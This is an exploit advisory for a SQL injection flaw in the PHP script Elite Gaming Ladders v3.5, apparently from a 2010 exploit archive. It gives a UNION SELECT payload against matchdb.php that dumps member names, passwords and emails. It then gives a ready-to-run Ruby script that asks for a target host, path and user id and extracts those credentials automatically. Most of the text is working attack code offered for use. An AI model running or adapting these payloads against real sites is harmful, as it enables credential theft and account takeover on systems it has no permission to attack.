----------------------------Information------------------------------------------------
+Name : Elite Gaming Ladders <= v3.5 SQL injection Vulnerability & Exploit
+Autor : Easy Laster
+Date   : 11.04.2010
+Script  : Elite Gaming Ladders <= v3.5
+Demo : http://eliteladders.com/demo/
+Download : ------------------
+Price : 170$
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project 4004-security-project.com
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101.

---------------------------------------------------------------------------------------

 ___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|


----------------------------------------------------------------------------------------
+Vulnerability : http://www.site.com/game/matchdb.php?match=


+Exploitable   : http://www.site.com/game/matchdb.php?match=9999999+and+1=0+union+
select+1,2,3,4,5,concat(name,0x3a,password,0x3a,email),7+from+members+where+id=1--

-----------------------------------------------------------------------------------------

#Exploit

#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
print "
#########################################################
#                   4004-Security-Project               #
#########################################################
#        Elite Gaming Ladders <= v3.5 SQL injection     #
#                          Exploit                      #
#                     Using Host+Path                   #
#                    www.demo.de /forum/ 1              #
#                         Easy Laster                   #
#########################################################
"
require 'net/http'
print "#########################################################"
print "\nEnter host name (site.com)->"
host=gets.chomp
print "#########################################################"
print "\nEnter script path (/forum/)->"
path=gets.chomp
print "#########################################################"
print "\nEnter script path (userid)->"
userid=gets.chomp
print "#########################################################"
begin
dir = "matchdb.php?match=9999999+and+1=0+union+select+1,2,3,4,5,concat(0x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23),7+from+members+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nid -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "matchdb.php?match=9999999+and+1=0+union+select+1,2,3,4,5,concat(0x23,0x23,0x23,0x23,0x23,password,0x23,0x23,0x23,0x23,0x23),7+from+members+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\npassword -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "matchdb.php?match=9999999+and+1=0+union+select+1,2,3,4,5,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23),7+from+members+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nEmail -> "+(/#####(.+)#####/).match(resp.body)[1]
print "\n#########################################################"
rescue
print "\nExploit failed"
end